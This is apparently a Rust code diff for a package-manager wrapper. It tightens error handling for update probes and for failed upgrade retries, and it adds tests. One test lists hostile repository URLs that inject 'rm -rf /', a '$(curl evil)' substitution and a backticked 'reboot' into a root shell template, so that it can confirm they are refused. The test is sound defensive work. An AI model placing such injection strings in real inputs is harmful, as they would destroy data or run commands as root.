@@ -1686,20 +1686,30 @@ impl Searchable for GenericSearchable {
             .or(self.core.config.list_binary.as_deref())
             .unwrap_or(self.core.binary());
         let args: Vec<&str> = probe.args.iter().map(|s| s.as_str()).collect();
-        // `run_output`, not `probe_output`: several managers report "there are updates" with a
-        // non-zero exit — `dnf check-update` returns 100 — and that is an answer, not a fault.
-        // A genuine failure still arrives as an error, because Q40 made silence one.
-        let output = match self.core.executor.run_output(bin, &args, false).await {
-            Ok(o) => o,
-            // Asked, and the manager's documented way of saying "none". `Some(vec![])` and not
-            // `None`: `None` would send the caller round the per-package path for an answer it
-            // already has, which is the 771s `Q44` measured.
-            Err(e) if probe.silence_is_none && e.to_string().contains("no output") => {
-                return Ok(Some(Vec::new()))
+        // `run_output_maybe_silent`, not `run_output`: several managers report "there are
+        // updates" with a non-zero exit — `dnf check-update` returns 100 — and that is an
+        // answer, not a fault. The None half is typed at the executor: it is exactly the ran-
+        // failed-and-said-nothing case, and never the idle-timeout kill, which errors here and
+        // propagates. Matching the old error prose instead is how "no output" from a wedged,
+        // killed query once read as zero updates.
+        match self
+            .core
+            .executor
+            .run_output_maybe_silent(bin, &args, false)
+            .await?
+        {
+            Some(output) => Ok(Some((probe.parse)(&output))),
+            None if probe.silence_is_none => {
+                // Asked, and the manager's documented way of saying "none". `Some(vec![])` and
+                // not `None`: `None` would send the caller round the per-package path for an
+                // answer it already has, which is the 771s `Q44` measured.
+                Ok(Some(Vec::new()))
             }
-            Err(e) => return Err(e),
-        };
-        Ok(Some((probe.parse)(&output)))
+            None => Err(Error::command_failed(format!(
+                "`{bin} {}` exited without producing an answer",
+                args.join(" ")
+            ))),
+        }
     }
 }
 
@@ -1805,11 +1815,29 @@ impl Upgradable for GenericUpgradable {
                 self.core.name,
                 specs.len()
             );
+            // The loop isolates failures; it does not swallow them. Every retry failing used
+            // to fall through to `Ok(())` — exit 0 over zero upgraded packages.
+            let total = specs.len();
+            let mut failed: Vec<String> = Vec::new();
             for spec in specs {
-                // Deliberately not `?`: the executor has already reported which one and why.
-                let _ = installer.install(&[spec], sudo).await;
+                if installer
+                    .install(std::slice::from_ref(&spec), sudo)
+                    .await
+                    .is_err()
+                {
+                    failed.push(spec.name);
+                }
             }
-            return Ok(());
+            if failed.is_empty() {
+                return Ok(());
+            }
+            return Err(Error::command_failed(format!(
+                "`{}` upgraded by reinstalling, and {} of {} package(s) failed: {}",
+                self.core.name,
+                failed.len(),
+                total,
+                failed.join(", ")
+            )));
         }
         let args: Vec<&str> = self
             .core
@@ -3427,6 +3455,34 @@ installed ripgrep 15.2.0
         );
     }
 
+    /// **A `{url}` that lands inside an `sh -c` template cannot be allowed to break out of its
+    /// single quotes.** The pacman and apk rows interpolate the URL into a root shell string;
+    /// one `'` in it ends the quoted region and everything after is a new command as root.
+    /// `reject_shell_meta` refuses exactly this — pinned here so the guard cannot quietly
+    /// narrow while the templates still exist.
+    #[tokio::test]
+    async fn a_url_that_could_break_the_shell_template_is_refused_before_anything_runs() {
+        let vfs = Arc::new(DashMap::new());
+        let mock = Arc::new(MockExecutor::new(vfs.clone()));
+        let mgr = apk_repo(mock.clone(), vfs);
+        for hostile in [
+            "http://mirror.example.invalid/' ; rm -rf / #",
+            "http://m.example.invalid/$(curl evil)",
+            "http://m.example.invalid/x`reboot`y",
+        ] {
+            let err = mgr
+                .add_repo("mine", hostile, false)
+                .await
+                .expect_err("a quote in the URL would end the sh -c string");
+            assert!(err.to_string().contains("Unsafe"), "{hostile}: {err}");
+        }
+        assert!(
+            mock.get_calls().await.is_empty(),
+            "nothing ran for any of them: {:?}",
+            mock.get_calls().await
+        );
+    }
+
     #[test]
     fn a_placeholder_is_recognised_wherever_it_sits_in_the_argument() {
         assert_eq!(find_placeholder("{url}").as_deref(), Some("{url}"));
@@ -3500,6 +3556,48 @@ installed ripgrep 15.2.0
         for name in ["a", "b", "c"] {
             assert!(installs[0].contains(name), "{:?}", installs);
         }
+    }
+
+    /// **And when nothing upgrades, that is not success.** The batch failed, every individual
+    /// retry failed, and the function returned `Ok(())` — exit 0 with zero packages upgraded,
+    /// `ensure_status` logged at debug. The isolating loop exists so one bad package does not
+    /// strand the rest; it does not exist to swallow the report when they all fail.
+    #[tokio::test]
+    async fn an_upgrade_whose_every_attempt_fails_is_reported() {
+        let vfs = Arc::new(DashMap::new());
+        let mock = Arc::new(MockExecutor::new(vfs.clone()));
+        // Every shape the reinstall takes must fail: the batch and each individual retry.
+        // (The mock answers by exact command line; npm terminates its options, so the
+        // names arrive after `--`.)
+        for line in [
+            "npm install -g -- a b",
+            "npm install -g -- a",
+            "npm install -g -- b",
+        ] {
+            mock.set_response(
+                line,
+                Err(crate::core::Error::Io("registry unreachable".into())),
+            );
+        }
+        let mut core = apt_like_core(mock.clone(), vfs);
+        core.name = "npm".into();
+        core.config.name = "npm".into();
+        core.config.list_binary = None;
+        core.config.list_args = vec!["ls".into()];
+        core.config.install_args = vec!["install".into(), "-g".into()];
+        core.config.upgrade_reinstall_args = Some(vec!["install".into(), "-g".into()]);
+        core.parser = Arc::new(crate::parsers::LambdaParser {
+            installed_fn: |_| Ok(vec![Package::new("a", "npm"), Package::new("b", "npm")]),
+            search_fn: |_| Vec::new(),
+        });
+        let u = GenericUpgradable {
+            core: Arc::new(core),
+        };
+        let e = u
+            .upgrade(false)
+            .await
+            .expect_err("nothing upgraded must not read as upgraded");
+        assert!(e.to_string().contains("failed"), "{e}");
     }
 }
 
